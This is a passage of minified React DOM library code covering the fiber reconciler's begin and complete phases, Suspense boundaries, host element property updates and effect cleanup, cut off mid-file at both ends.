                    t.child = null === e ? Xo(t, null, n, r) : Yo(t, e.child, n, r)
                }

                function As(e, t, n, r, i) {
                    n = n.render;
                    var o = t.ref;
                    return So(t, i), r = Ea(e, t, n, r, o, i), n = Sa(), null === e || ws ? (io && n && eo(t), t.flags |= 1, xs(e, t, r, i), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~i, Qs(e, t, i))
                }

                function ks(e, t, n, r, i) {
                    if (null === e) {
                        var o = n.type;
                        return "function" !== typeof o || Ol(o) || void 0 !== o.defaultProps || null !== n.compare || void 0 !== n.defaultProps ? ((e = Ml(n.type, null, r, t, t.mode, i)).ref = t.ref, e.return = t, t.child = e) : (t.tag = 15, t.type = o, Es(e, t, o, r, i))
                    }
                    if (o = e.child, 0 === (e.lanes & i)) {
                        var a = o.memoizedProps;
                        if ((n = null !== (n = n.compare) ? n : cr)(a, r) && e.ref === t.ref) return Qs(e, t, i)
                    }
                    return t.flags |= 1, (e = Rl(o, r)).ref = t.ref, e.return = t, t.child = e
                }

                function Es(e, t, n, r, i) {
                    if (null !== e) {
                        var o = e.memoizedProps;
                        if (cr(o, r) && e.ref === t.ref) {
                            if (ws = !1, t.pendingProps = r = o, 0 === (e.lanes & i)) return t.lanes = e.lanes, Qs(e, t, i);
                            0 !== (131072 & e.flags) && (ws = !0)
                        }
                    }
                    return _s(e, t, n, r, i)
                }

                function Ss(e, t, n) {
                    var r = t.pendingProps,
                        i = r.children,
                        o = null !== e ? e.memoizedState : null;
                    if ("hidden" === r.mode)
                        if (0 === (1 & t.mode)) t.memoizedState = {
                            baseLanes: 0,
                            cachePool: null,
                            transitions: null
                        }, Ci(Rc, Oc), Oc |= n;
                        else {
                            if (0 === (1073741824 & n)) return e = null !== o ? o.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
                                baseLanes: e,
                                cachePool: null,
                                transitions: null
                            }, t.updateQueue = null, Ci(Rc, Oc), Oc |= e, null;
                            t.memoizedState = {
                                baseLanes: 0,
                                cachePool: null,
                                transitions: null
                            }, r = null !== o ? o.baseLanes : n, Ci(Rc, Oc), Oc |= r
                        }
                    else null !== o ? (r = o.baseLanes | n, t.memoizedState = null) : r = n, Ci(Rc, Oc), Oc |= r;
                    return xs(e, t, i, n), t.child
                }

                function Cs(e, t) {
                    var n = t.ref;
                    (null === e && null !== n || null !== e && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
                }

                function _s(e, t, n, r, i) {
                    var o = Ni(n) ? Ti : Ii.current;
                    return o = Bi(t, o), So(t, i), n = Ea(e, t, n, r, o, i), r = Sa(), null === e || ws ? (io && r && eo(t), t.flags |= 1, xs(e, t, n, i), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~i, Qs(e, t, i))
                }

                function Is(e, t, n, r, i) {
                    if (Ni(n)) {
                        var o = !0;
                        ji(t)
                    } else o = !1;
                    if (So(t, i), null === t.stateNode) qs(e, t), qo(t, n, r), Wo(t, n, r, i), r = !0;
                    else if (null === e) {
                        var a = t.stateNode,
                            s = t.memoizedProps;
                        a.props = s;
                        var c = a.context,
                            l = n.contextType;
                        "object" === typeof l && null !== l ? l = Co(l) : l = Bi(t, l = Ni(n) ? Ti : Ii.current);
                        var u = n.getDerivedStateFromProps,
                            d = "function" === typeof u || "function" === typeof a.getSnapshotBeforeUpdate;
                        d || "function" !== typeof a.UNSAFE_componentWillReceiveProps && "function" !== typeof a.componentWillReceiveProps || (s !== r || c !== l) && Qo(t, a, r, l), Bo = !1;
                        var f = t.memoizedState;
                        a.state = f, Lo(t, r, a, i), c = t.memoizedState, s !== r || f !== c || Pi.current || Bo ? ("function" === typeof u && (Uo(t, n, u, r), c = t.memoizedState), (s = Bo || Go(t, n, s, r, f, c, l)) ? (d || "function" !== typeof a.UNSAFE_componentWillMount && "function" !== typeof a.componentWillMount || ("function" === typeof a.componentWillMount && a.componentWillMount(), "function" === typeof a.UNSAFE_componentWillMount && a.UNSAFE_componentWillMount()), "function" === typeof a.componentDidMount && (t.flags |= 4194308)) : ("function" === typeof a.componentDidMount && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = c), a.props = r, a.state = c, a.context = l, r = s) : ("function" === typeof a.componentDidMount && (t.flags |= 4194308), r = !1)
                    } else {
                        a = t.stateNode, Oo(e, t), s = t.memoizedProps, l = t.type === t.elementType ? s : vo(t.type, s), a.props = l, d = t.pendingProps, f = a.context, "object" === typeof(c = n.contextType) && null !== c ? c = Co(c) : c = Bi(t, c = Ni(n) ? Ti : Ii.current);
                        var h = n.getDerivedStateFromProps;
                        (u = "function" === typeof h || "function" === typeof a.getSnapshotBeforeUpdate) || "function" !== typeof a.UNSAFE_componentWillReceiveProps && "function" !== typeof a.componentWillReceiveProps || (s !== d || f !== c) && Qo(t, a, r, c), Bo = !1, f = t.memoizedState, a.state = f, Lo(t, r, a, i);
                        var p = t.memoizedState;
                        s !== d || f !== p || Pi.current || Bo ? ("function" === typeof h && (Uo(t, n, h, r), p = t.memoizedState), (l = Bo || Go(t, n, l, r, f, p, c) || !1) ? (u || "function" !== typeof a.UNSAFE_componentWillUpdate && "function" !== typeof a.componentWillUpdate || ("function" === typeof a.componentWillUpdate && a.componentWillUpdate(r, p, c), "function" === typeof a.UNSAFE_componentWillUpdate && a.UNSAFE_componentWillUpdate(r, p, c)), "function" === typeof a.componentDidUpdate && (t.flags |= 4), "function" === typeof a.getSnapshotBeforeUpdate && (t.flags |= 1024)) : ("function" !== typeof a.componentDidUpdate || s === e.memoizedProps && f === e.memoizedState || (t.flags |= 4), "function" !== typeof a.getSnapshotBeforeUpdate || s === e.memoizedProps && f === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = p), a.props = r, a.state = p, a.context = c, r = l) : ("function" !== typeof a.componentDidUpdate || s === e.memoizedProps && f === e.memoizedState || (t.flags |= 4), "function" !== typeof a.getSnapshotBeforeUpdate || s === e.memoizedProps && f === e.memoizedState || (t.flags |= 1024), r = !1)
                    }
                    return Ps(e, t, n, r, o, i)
                }

                function Ps(e, t, n, r, i, o) {
                    Cs(e, t);
                    var a = 0 !== (128 & t.flags);
                    if (!r && !a) return i && Fi(t, n, !1), Qs(e, t, o);
                    r = t.stateNode, bs.current = t;
                    var s = a && "function" !== typeof n.getDerivedStateFromError ? null : r.render();
                    return t.flags |= 1, null !== e && a ? (t.child = Yo(t, e.child, null, o), t.child = Yo(t, null, s, o)) : xs(e, t, s, o), t.memoizedState = r.state, i && Fi(t, n, !0), t.child
                }

                function Ts(e) {
                    var t = e.stateNode;
                    t.pendingContext ? Ri(0, t.pendingContext, t.pendingContext !== t.context) : t.context && Ri(0, t.context, !1), ia(e, t.containerInfo)
                }

                function Bs(e, t, n, r, i) {
                    return po(), mo(i), t.flags |= 256, xs(e, t, n, r), t.child
                }
                var Ns, Os, Rs, Ms, js = {
                    dehydrated: null,
                    treeContext: null,
                    retryLane: 0
                };

                function Fs(e) {
                    return {
                        baseLanes: e,
                        cachePool: null,
                        transitions: null
                    }
                }

                function Ls(e, t, n) {
                    var r, i = t.pendingProps,
                        a = ca.current,
                        s = !1,
                        c = 0 !== (128 & t.flags);
                    if ((r = c) || (r = (null === e || null !== e.memoizedState) && 0 !== (2 & a)), r ? (s = !0, t.flags &= -129) : null !== e && null === e.memoizedState || (a |= 1), Ci(ca, 1 & a), null === e) return lo(t), null !== (e = t.memoizedState) && null !== (e = e.dehydrated) ? (0 === (1 & t.mode) ? t.lanes = 1 : "$!" === e.data ? t.lanes = 8 : t.lanes = 1073741824, null) : (c = i.children, e = i.fallback, s ? (i = t.mode, s = t.child, c = {
                        mode: "hidden",
                        children: c
                    }, 0 === (1 & i) && null !== s ? (s.childLanes = 0, s.pendingProps = c) : s = Fl(c, i, 0, null), e = jl(e, i, n, null), s.return = t, e.return = t, s.sibling = e, t.child = s, t.child.memoizedState = Fs(n), t.memoizedState = js, e) : Ds(t, c));
                    if (null !== (a = e.memoizedState) && null !== (r = a.dehydrated)) return function(e, t, n, r, i, a, s) {
                        if (n) return 256 & t.flags ? (t.flags &= -257, Hs(e, t, s, r = ds(Error(o(422))))) : null !== t.memoizedState ? (t.child = e.child, t.flags |= 128, null) : (a = r.fallback, i = t.mode, r = Fl({
                            mode: "visible",
                            children: r.children
                        }, i, 0, null), (a = jl(a, i, s, null)).flags |= 2, r.return = t, a.return = t, r.sibling = a, t.child = r, 0 !== (1 & t.mode) && Yo(t, e.child, null, s), t.child.memoizedState = Fs(s), t.memoizedState = js, a);
                        if (0 === (1 & t.mode)) return Hs(e, t, s, null);
                        if ("$!" === i.data) {
                            if (r = i.nextSibling && i.nextSibling.dataset) var c = r.dgst;
                            return r = c, Hs(e, t, s, r = ds(a = Error(o(419)), r, void 0))
                        }
                        if (c = 0 !== (s & e.childLanes), ws || c) {
                            if (null !== (r = Tc)) {
                                switch (s & -s) {
                                    case 4:
                                        i = 2;
                                        break;
                                    case 16:
                                        i = 8;
                                        break;
                                    case 64:
                                    case 128:
                                    case 256:
                                    case 512:
                                    case 1024:
                                    case 2048:
                                    case 4096:
                                    case 8192:
                                    case 16384:
                                    case 32768:
                                    case 65536:
                                    case 131072:
                                    case 262144:
                                    case 524288:
                                    case 1048576:
                                    case 2097152:
                                    case 4194304:
                                    case 8388608:
                                    case 16777216:
                                    case 33554432:
                                    case 67108864:
                                        i = 32;
                                        break;
                                    case 536870912:
                                        i = 268435456;
                                        break;
                                    default:
                                        i = 0
                                }
                                0 !== (i = 0 !== (i & (r.suspendedLanes | s)) ? 0 : i) && i !== a.retryLane && (a.retryLane = i, To(e, i), rl(r, e, i, -1))
                            }
                            return gl(), Hs(e, t, s, r = ds(Error(o(421))))
                        }
                        return "$?" === i.data ? (t.flags |= 128, t.child = e.child, t = Il.bind(null, e), i._reactRetry = t, null) : (e = a.treeContext, ro = li(i.nextSibling), no = t, io = !0, oo = null, null !== e && (Vi[Zi++] = Ji, Vi[Zi++] = Yi, Vi[Zi++] = Ki, Ji = e.id, Yi = e.overflow, Ki = t), t = Ds(t, r.children), t.flags |= 4096, t)
                    }(e, t, c, i, r, a, n);
                    if (s) {
                        s = i.fallback, c = t.mode, r = (a = e.child).sibling;
                        var l = {
                            mode: "hidden",
                            children: i.children
                        };
                        return 0 === (1 & c) && t.child !== a ? ((i = t.child).childLanes = 0, i.pendingProps = l, t.deletions = null) : (i = Rl(a, l)).subtreeFlags = 14680064 & a.subtreeFlags, null !== r ? s = Rl(r, s) : (s = jl(s, c, n, null)).flags |= 2, s.return = t, i.return = t, i.sibling = s, t.child = i, i = s, s = t.child, c = null === (c = e.child.memoizedState) ? Fs(n) : {
                            baseLanes: c.baseLanes | n,
                            cachePool: null,
                            transitions: c.transitions
                        }, s.memoizedState = c, s.childLanes = e.childLanes & ~n, t.memoizedState = js, i
                    }
                    return e = (s = e.child).sibling, i = Rl(s, {
                        mode: "visible",
                        children: i.children
                    }), 0 === (1 & t.mode) && (i.lanes = n), i.return = t, i.sibling = null, null !== e && (null === (n = t.deletions) ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = i, t.memoizedState = null, i
                }

                function Ds(e, t) {
                    return (t = Fl({
                        mode: "visible",
                        children: t
                    }, e.mode, 0, null)).return = e, e.child = t
                }

                function Hs(e, t, n, r) {
                    return null !== r && mo(r), Yo(t, e.child, null, n), (e = Ds(t, t.pendingProps.children)).flags |= 2, t.memoizedState = null, e
                }

                function Us(e, t, n) {
                    e.lanes |= t;
                    var r = e.alternate;
                    null !== r && (r.lanes |= t), Eo(e.return, t, n)
                }

                function zs(e, t, n, r, i) {
                    var o = e.memoizedState;
                    null === o ? e.memoizedState = {
                        isBackwards: t,
                        rendering: null,
                        renderingStartTime: 0,
                        last: r,
                        tail: n,
                        tailMode: i
                    } : (o.isBackwards = t, o.rendering = null, o.renderingStartTime = 0, o.last = r, o.tail = n, o.tailMode = i)
                }

                function Gs(e, t, n) {
                    var r = t.pendingProps,
                        i = r.revealOrder,
                        o = r.tail;
                    if (xs(e, t, r.children, n), 0 !== (2 & (r = ca.current))) r = 1 & r | 2, t.flags |= 128;
                    else {
                        if (null !== e && 0 !== (128 & e.flags)) e: for (e = t.child; null !== e;) {
                            if (13 === e.tag) null !== e.memoizedState && Us(e, n, t);
                            else if (19 === e.tag) Us(e, n, t);
                            else if (null !== e.child) {
                                e.child.return = e, e = e.child;
                                continue
                            }
                            if (e === t) break e;
                            for (; null === e.sibling;) {
                                if (null === e.return || e.return === t) break e;
                                e = e.return
                            }
                            e.sibling.return = e.return, e = e.sibling
                        }
                        r &= 1
                    }
                    if (Ci(ca, r), 0 === (1 & t.mode)) t.memoizedState = null;
                    else switch (i) {
                        case "forwards":
                            for (n = t.child, i = null; null !== n;) null !== (e = n.alternate) && null === la(e) && (i = n), n = n.sibling;
                            null === (n = i) ? (i = t.child, t.child = null) : (i = n.sibling, n.sibling = null), zs(t, !1, i, n, o);
                            break;
                        case "backwards":
                            for (n = null, i = t.child, t.child = null; null !== i;) {
                                if (null !== (e = i.alternate) && null === la(e)) {
                                    t.child = i;
                                    break
                                }
                                e = i.sibling, i.sibling = n, n = i, i = e
                            }
                            zs(t, !0, n, null, o);
                            break;
                        case "together":
                            zs(t, !1, null, null, void 0);
                            break;
                        default:
                            t.memoizedState = null
                    }
                    return t.child
                }

                function qs(e, t) {
                    0 === (1 & t.mode) && null !== e && (e.alternate = null, t.alternate = null, t.flags |= 2)
                }

                function Qs(e, t, n) {
                    if (null !== e && (t.dependencies = e.dependencies), Fc |= t.lanes, 0 === (n & t.childLanes)) return null;
                    if (null !== e && t.child !== e.child) throw Error(o(153));
                    if (null !== t.child) {
                        for (n = Rl(e = t.child, e.pendingProps), t.child = n, n.return = t; null !== e.sibling;) e = e.sibling, (n = n.sibling = Rl(e, e.pendingProps)).return = t;
                        n.sibling = null
                    }
                    return t.child
                }

                function Ws(e, t) {
                    if (!io) switch (e.tailMode) {
                        case "hidden":
                            t = e.tail;
                            for (var n = null; null !== t;) null !== t.alternate && (n = t), t = t.sibling;
                            null === n ? e.tail = null : n.sibling = null;
                            break;
                        case "collapsed":
                            n = e.tail;
                            for (var r = null; null !== n;) null !== n.alternate && (r = n), n = n.sibling;
                            null === r ? t || null === e.tail ? e.tail = null : e.tail.sibling = null : r.sibling = null
                    }
                }

                function Vs(e) {
                    var t = null !== e.alternate && e.alternate.child === e.child,
                        n = 0,
                        r = 0;
                    if (t)
                        for (var i = e.child; null !== i;) n |= i.lanes | i.childLanes, r |= 14680064 & i.subtreeFlags, r |= 14680064 & i.flags, i.return = e, i = i.sibling;
                    else
                        for (i = e.child; null !== i;) n |= i.lanes | i.childLanes, r |= i.subtreeFlags, r |= i.flags, i.return = e, i = i.sibling;
                    return e.subtreeFlags |= r, e.childLanes = n, t
                }

                function Zs(e, t, n) {
                    var r = t.pendingProps;
                    switch (to(t), t.tag) {
                        case 2:
                        case 16:
                        case 15:
                        case 0:
                        case 11:
                        case 7:
                        case 8:
                        case 12:
                        case 9:
                        case 14:
                            return Vs(t), null;
                        case 1:
                        case 17:
                            return Ni(t.type) && Oi(), Vs(t), null;
                        case 3:
                            return r = t.stateNode, oa(), Si(Pi), Si(Ii), da(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), null !== e && null !== e.child || (fo(t) ? t.flags |= 4 : null === e || e.memoizedState.isDehydrated && 0 === (256 & t.flags) || (t.flags |= 1024, null !== oo && (sl(oo), oo = null))), Os(e, t), Vs(t), null;
                        case 5:
                            sa(t);
                            var i = ra(na.current);
                            if (n = t.type, null !== e && null != t.stateNode) Rs(e, t, n, r, i), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
                            else {
                                if (!r) {
                                    if (null === t.stateNode) throw Error(o(166));
                                    return Vs(t), null
                                }
                                if (e = ra(ea.current), fo(t)) {
                                    r = t.stateNode, n = t.type;
                                    var a = t.memoizedProps;
                                    switch (r[fi] = t, r[hi] = a, e = 0 !== (1 & t.mode), n) {
                                        case "dialog":
                                            Dr("cancel", r), Dr("close", r);
                                            break;
                                        case "iframe":
                                        case "object":
                                        case "embed":
                                            Dr("load", r);
                                            break;
                                        case "video":
                                        case "audio":
                                            for (i = 0; i < Mr.length; i++) Dr(Mr[i], r);
                                            break;
                                        case "source":
                                            Dr("error", r);
                                            break;
                                        case "img":
                                        case "image":
                                        case "link":
                                            Dr("error", r), Dr("load", r);
                                            break;
                                        case "details":
                                            Dr("toggle", r);
                                            break;
                                        case "input":
                                            J(r, a), Dr("invalid", r);
                                            break;
                                        case "select":
                                            r._wrapperState = {
                                                wasMultiple: !!a.multiple
                                            }, Dr("invalid", r);
                                            break;
                                        case "textarea":
                                            ie(r, a), Dr("invalid", r)
                                    }
                                    for (var c in ye(n, a), i = null, a)
                                        if (a.hasOwnProperty(c)) {
                                            var l = a[c];
                                            "children" === c ? "string" === typeof l ? r.textContent !== l && (!0 !== a.suppressHydrationWarning && Xr(r.textContent, l, e), i = ["children", l]) : "number" === typeof l && r.textContent !== "" + l && (!0 !== a.suppressHydrationWarning && Xr(r.textContent, l, e), i = ["children", "" + l]) : s.hasOwnProperty(c) && null != l && "onScroll" === c && Dr("scroll", r)
                                        }
                                    switch (n) {
                                        case "input":
                                            W(r), $(r, a, !0);
                                            break;
                                        case "textarea":
                                            W(r), ae(r);
                                            break;
                                        case "select":
                                        case "option":
                                            break;
                                        default:
                                            "function" === typeof a.onClick && (r.onclick = $r)
                                    }
                                    r = i, t.updateQueue = r, null !== r && (t.flags |= 4)
                                } else {
                                    c = 9 === i.nodeType ? i : i.ownerDocument, "http://www.w3.org/1999/xhtml" === e && (e = se(n)), "http://www.w3.org/1999/xhtml" === e ? "script" === n ? ((e = c.createElement("div")).innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : "string" === typeof r.is ? e = c.createElement(n, {
                                        is: r.is
                                    }) : (e = c.createElement(n), "select" === n && (c = e, r.multiple ? c.multiple = !0 : r.size && (c.size = r.size))) : e = c.createElementNS(e, n), e[fi] = t, e[hi] = r, Ns(e, t, !1, !1), t.stateNode = e;
                                    e: {
                                        switch (c = be(n, r), n) {
                                            case "dialog":
                                                Dr("cancel", e), Dr("close", e), i = r;
                                                break;
                                            case "iframe":
                                            case "object":
                                            case "embed":
                                                Dr("load", e), i = r;
                                                break;
                                            case "video":
                                            case "audio":
                                                for (i = 0; i < Mr.length; i++) Dr(Mr[i], e);
                                                i = r;
                                                break;
                                            case "source":
                                                Dr("error", e), i = r;
                                                break;
                                            case "img":
                                            case "image":
                                            case "link":
                                                Dr("error", e), Dr("load", e), i = r;
                                                break;
                                            case "details":
                                                Dr("toggle", e), i = r;
                                                break;
                                            case "input":
                                                J(e, r), i = K(e, r), Dr("invalid", e);
                                                break;
                                            case "option":
                                            default:
                                                i = r;
                                                break;
                                            case "select":
                                                e._wrapperState = {
                                                    wasMultiple: !!r.multiple
                                                }, i = F({}, r, {
                                                    value: void 0
                                                }), Dr("invalid", e);
                                                break;
                                            case "textarea":
                                                ie(e, r), i = re(e, r), Dr("invalid", e)
                                        }
                                        for (a in ye(n, i), l = i)
                                            if (l.hasOwnProperty(a)) {
                                                var u = l[a];
                                                "style" === a ? ge(e, u) : "dangerouslySetInnerHTML" === a ? null != (u = u ? u.__html : void 0) && de(e, u) : "children" === a ? "string" === typeof u ? ("textarea" !== n || "" !== u) && fe(e, u) : "number" === typeof u && fe(e, "" + u) : "suppressContentEditableWarning" !== a && "suppressHydrationWarning" !== a && "autoFocus" !== a && (s.hasOwnProperty(a) ? null != u && "onScroll" === a && Dr("scroll", e) : null != u && b(e, a, u, c))
                                            }
                                        switch (n) {
                                            case "input":
                                                W(e), $(e, r, !1);
                                                break;
                                            case "textarea":
                                                W(e), ae(e);
                                                break;
                                            case "option":
                                                null != r.value && e.setAttribute("value", "" + q(r.value));
                                                break;
                                            case "select":
                                                e.multiple = !!r.multiple, null != (a = r.value) ? ne(e, !!r.multiple, a, !1) : null != r.defaultValue && ne(e, !!r.multiple, r.defaultValue, !0);
                                                break;
                                            default:
                                                "function" === typeof i.onClick && (e.onclick = $r)
                                        }
                                        switch (n) {
                                            case "button":
                                            case "input":
                                            case "select":
                                            case "textarea":
                                                r = !!r.autoFocus;
                                                break e;
                                            case "img":
                                                r = !0;
                                                break e;
                                            default:
                                                r = !1
                                        }
                                    }
                                    r && (t.flags |= 4)
                                }
                                null !== t.ref && (t.flags |= 512, t.flags |= 2097152)
                            }
                            return Vs(t), null;
                        case 6:
                            if (e && null != t.stateNode) Ms(e, t, e.memoizedProps, r);
                            else {
                                if ("string" !== typeof r && null === t.stateNode) throw Error(o(166));
                                if (n = ra(na.current), ra(ea.current), fo(t)) {
                                    if (r = t.stateNode, n = t.memoizedProps, r[fi] = t, (a = r.nodeValue !== n) && null !== (e = no)) switch (e.tag) {
                                        case 3:
                                            Xr(r.nodeValue, n, 0 !== (1 & e.mode));
                                            break;
                                        case 5:
                                            !0 !== e.memoizedProps.suppressHydrationWarning && Xr(r.nodeValue, n, 0 !== (1 & e.mode))
                                    }
                                    a && (t.flags |= 4)
                                } else(r = (9 === n.nodeType ? n : n.ownerDocument).createTextNode(r))[fi] = t, t.stateNode = r
                            }
                            return Vs(t), null;
                        case 13:
                            if (Si(ca), r = t.memoizedState, null === e || null !== e.memoizedState && null !== e.memoizedState.dehydrated) {
                                if (io && null !== ro && 0 !== (1 & t.mode) && 0 === (128 & t.flags)) ho(), po(), t.flags |= 98560, a = !1;
                                else if (a = fo(t), null !== r && null !== r.dehydrated) {
                                    if (null === e) {
                                        if (!a) throw Error(o(318));
                                        if (!(a = null !== (a = t.memoizedState) ? a.dehydrated : null)) throw Error(o(317));
                                        a[fi] = t
                                    } else po(), 0 === (128 & t.flags) && (t.memoizedState = null), t.flags |= 4;
                                    Vs(t), a = !1
                                } else null !== oo && (sl(oo), oo = null), a = !0;
                                if (!a) return 65536 & t.flags ? t : null
                            }
                            return 0 !== (128 & t.flags) ? (t.lanes = n, t) : ((r = null !== r) !== (null !== e && null !== e.memoizedState) && r && (t.child.flags |= 8192, 0 !== (1 & t.mode) && (null === e || 0 !== (1 & ca.current) ? 0 === Mc && (Mc = 3) : gl())), null !== t.updateQueue && (t.flags |= 4), Vs(t), null);
                        case 4:
                            return oa(), Os(e, t), null === e && zr(t.stateNode.containerInfo), Vs(t), null;
                        case 10:
                            return ko(t.type._context), Vs(t), null;
                        case 19:
                            if (Si(ca), null === (a = t.memoizedState)) return Vs(t), null;
                            if (r = 0 !== (128 & t.flags), null === (c = a.rendering))
                                if (r) Ws(a, !1);
                                else {
                                    if (0 !== Mc || null !== e && 0 !== (128 & e.flags))
                                        for (e = t.child; null !== e;) {
                                            if (null !== (c = la(e))) {
                                                for (t.flags |= 128, Ws(a, !1), null !== (r = c.updateQueue) && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; null !== n;) e = r, (a = n).flags &= 14680066, null === (c = a.alternate) ? (a.childLanes = 0, a.lanes = e, a.child = null, a.subtreeFlags = 0, a.memoizedProps = null, a.memoizedState = null, a.updateQueue = null, a.dependencies = null, a.stateNode = null) : (a.childLanes = c.childLanes, a.lanes = c.lanes, a.child = c.child, a.subtreeFlags = 0, a.deletions = null, a.memoizedProps = c.memoizedProps, a.memoizedState = c.memoizedState, a.updateQueue = c.updateQueue, a.type = c.type, e = c.dependencies, a.dependencies = null === e ? null : {
                                                    lanes: e.lanes,
                                                    firstContext: e.firstContext
                                                }), n = n.sibling;
                                                return Ci(ca, 1 & ca.current | 2), t.child
                                            }
                                            e = e.sibling
                                        }
                                    null !== a.tail && Ye() > Gc && (t.flags |= 128, r = !0, Ws(a, !1), t.lanes = 4194304)
                                }
                            else {
                                if (!r)
                                    if (null !== (e = la(c))) {
                                        if (t.flags |= 128, r = !0, null !== (n = e.updateQueue) && (t.updateQueue = n, t.flags |= 4), Ws(a, !0), null === a.tail && "hidden" === a.tailMode && !c.alternate && !io) return Vs(t), null
                                    } else 2 * Ye() - a.renderingStartTime > Gc && 1073741824 !== n && (t.flags |= 128, r = !0, Ws(a, !1), t.lanes = 4194304);
                                a.isBackwards ? (c.sibling = t.child, t.child = c) : (null !== (n = a.last) ? n.sibling = c : t.child = c, a.last = c)
                            }
                            return null !== a.tail ? (t = a.tail, a.rendering = t, a.tail = t.sibling, a.renderingStartTime = Ye(), t.sibling = null, n = ca.current, Ci(ca, r ? 1 & n | 2 : 1 & n), t) : (Vs(t), null);
                        case 22:
                        case 23:
                            return fl(), r = null !== t.memoizedState, null !== e && null !== e.memoizedState !== r && (t.flags |= 8192), r && 0 !== (1 & t.mode) ? 0 !== (1073741824 & Oc) && (Vs(t), 6 & t.subtreeFlags && (t.flags |= 8192)) : Vs(t), null;
                        case 24:
                        case 25:
                            return null
                    }
                    throw Error(o(156, t.tag))
                }

                function Ks(e, t) {
                    switch (to(t), t.tag) {
                        case 1:
                            return Ni(t.type) && Oi(), 65536 & (e = t.flags) ? (t.flags = -65537 & e | 128, t) : null;
                        case 3:
                            return oa(), Si(Pi), Si(Ii), da(), 0 !== (65536 & (e = t.flags)) && 0 === (128 & e) ? (t.flags = -65537 & e | 128, t) : null;
                        case 5:
                            return sa(t), null;
                        case 13:
                            if (Si(ca), null !== (e = t.memoizedState) && null !== e.dehydrated) {
                                if (null === t.alternate) throw Error(o(340));
                                po()
                            }
                            return 65536 & (e = t.flags) ? (t.flags = -65537 & e | 128, t) : null;
                        case 19:
                            return Si(ca), null;
                        case 4:
                            return oa(), null;
                        case 10:
                            return ko(t.type._context), null;
                        case 22:
                        case 23:
                            return fl(), null;
                        default:
                            return null
                    }
                }
                Ns = function(e, t) {
                    for (var n = t.child; null !== n;) {
                        if (5 === n.tag || 6 === n.tag) e.appendChild(n.stateNode);
                        else if (4 !== n.tag && null !== n.child) {
                            n.child.return = n, n = n.child;
                            continue
                        }
                        if (n === t) break;
                        for (; null === n.sibling;) {
                            if (null === n.return || n.return === t) return;
                            n = n.return
                        }
                        n.sibling.return = n.return, n = n.sibling
                    }
                }, Os = function() {}, Rs = function(e, t, n, r) {
                    var i = e.memoizedProps;
                    if (i !== r) {
                        e = t.stateNode, ra(ea.current);
                        var o, a = null;
                        switch (n) {
                            case "input":
                                i = K(e, i), r = K(e, r), a = [];
                                break;
                            case "select":
                                i = F({}, i, {
                                    value: void 0
                                }), r = F({}, r, {
                                    value: void 0
                                }), a = [];
                                break;
                            case "textarea":
                                i = re(e, i), r = re(e, r), a = [];
                                break;
                            default:
                                "function" !== typeof i.onClick && "function" === typeof r.onClick && (e.onclick = $r)
                        }
                        for (u in ye(n, r), n = null, i)
                            if (!r.hasOwnProperty(u) && i.hasOwnProperty(u) && null != i[u])
                                if ("style" === u) {
                                    var c = i[u];
                                    for (o in c) c.hasOwnProperty(o) && (n || (n = {}), n[o] = "")
                                } else "dangerouslySetInnerHTML" !== u && "children" !== u && "suppressContentEditableWarning" !== u && "suppressHydrationWarning" !== u && "autoFocus" !== u && (s.hasOwnProperty(u) ? a || (a = []) : (a = a || []).push(u, null));
                        for (u in r) {
                            var l = r[u];
                            if (c = null != i ? i[u] : void 0, r.hasOwnProperty(u) && l !== c && (null != l || null != c))
                                if ("style" === u)
                                    if (c) {
                                        for (o in c) !c.hasOwnProperty(o) || l && l.hasOwnProperty(o) || (n || (n = {}), n[o] = "");
                                        for (o in l) l.hasOwnProperty(o) && c[o] !== l[o] && (n || (n = {}), n[o] = l[o])
                                    } else n || (a || (a = []), a.push(u, n)), n = l;
                            else "dangerouslySetInnerHTML" === u ? (l = l ? l.__html : void 0, c = c ? c.__html : void 0, null != l && c !== l && (a = a || []).push(u, l)) : "children" === u ? "string" !== typeof l && "number" !== typeof l || (a = a || []).push(u, "" + l) : "suppressContentEditableWarning" !== u && "suppressHydrationWarning" !== u && (s.hasOwnProperty(u) ? (null != l && "onScroll" === u && Dr("scroll", e), a || c === l || (a = [])) : (a = a || []).push(u, l))
                        }
                        n && (a = a || []).push("style", n);
                        var u = a;
                        (t.updateQueue = u) && (t.flags |= 4)
                    }
                }, Ms = function(e, t, n, r) {
                    n !== r && (t.flags |= 4)
                };
                var Js = !1,
                    Ys = !1,
                    Xs = "function" === typeof WeakSet ? WeakSet : Set,
                    $s = null;

                function ec(e, t) {
                    var n = e.ref;
                    if (null !== n)
                        if ("function" === typeof n) try {
                            n(null)
                        } catch (r) {
                            Sl(e, t, r)
                        } else n.current = null
                }

                function tc(e, t, n) {
                    try {
                        n()
                    } catch (r) {
                        Sl(e, t, r)
                    }
                }
                var nc = !1;

                function rc(e, t, n) {
                    var r = t.updateQueue;
                    if (null !== (r = null !== r ? r.lastEffect : null)) {
                        var i = r = r.next;
                        do {
                            if ((i.tag & e) === e) {
                                var o = i.destroy;
                                i.destroy = void 0, void 0 !== o && tc(t, n, o)
                            }
                            i = i.next
                        } while (i !== r)
                    }
                }

                function ic(e, t) {
                    if (null !== (t = null !== (t = t.updateQueue) ? t.lastEffect : null)) {
                        var n = t = t.next;
                        do {
                            if ((n.tag & e) === e) {
                                var r = n.create;
                                n.destroy = r()
                            }
                            n = n.next
                        } while (n !== t)
                    }
                }

                function oc(e) {
                    var t = e.ref;
                    if (null !== t) {
                        var n = e.stateNode;
                        e.tag, e = n, "function" === typeof t ? t(e) : t.current = e
                    }
                }

                function ac(e) {
                    var t = e.alternate;
